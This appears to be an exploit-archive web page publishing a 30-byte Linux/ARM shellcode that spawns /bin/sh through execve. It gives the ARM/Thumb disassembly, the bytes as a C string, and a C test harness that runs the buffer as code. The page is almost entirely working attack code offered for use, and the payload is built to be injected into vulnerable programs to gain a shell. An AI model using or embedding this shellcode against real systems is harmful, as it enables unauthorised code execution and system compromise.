<html><head><title>Linux/ARM - execve(/bin/sh, [0], [0 vars]) - 30 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
Title:     Linux/ARM - execve(&quot;/bin/sh&quot;, [0], [0 vars]) - 30 bytes
Date:      2012-09-08
Tested on: ARM1176JZF-S (v6l)
Author:    midnitesnake

00008054 &lt;_start&gt;:
    8054:	e28f6001 	add	r6, pc, #1
    8058:	e12fff16 	bx	r6
    805c:	4678      	mov	r0, pc
    805e:	300a      	adds	r0, #10
    8060:	9001      	str	r0, [sp, #4]
    8062:	a901      	add	r1, sp, #4
    8064:	1a92      	subs	r2, r2, r2
    8066:	270b      	movs	r7, #11
    8068:	df01      	svc	1
    806a:	2f2f      	.short	0x2f2f
    806c:	2f6e6962 	.word	0x2f6e6962
    8070:	00006873 	.word	0x00006873
*/
#include &lt;stdio.h&gt;

char *SC =	&quot;\x01\x60\x8f\xe2&quot;
		&quot;\x16\xff\x2f\xe1&quot;
		&quot;\x78\x46&quot;
		&quot;\x0a\x30&quot;
		&quot;\x01\x90&quot;
		&quot;\x01\xa9&quot;
		&quot;\x92\x1a&quot;
		&quot;\x0b\x27&quot;
		&quot;\x01\xdf&quot;
		&quot;\x2f\x2f&quot;
		&quot;\x62\x69&quot;
		&quot;\x6e\x2f&quot;
		&quot;\x73\x68\x00\x00&quot;;

int main(void)
{
	fprintf(stdout,&quot;Length: %d\n&quot;,strlen(SC));
	(*(void(*)()) SC)();
return 0;
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
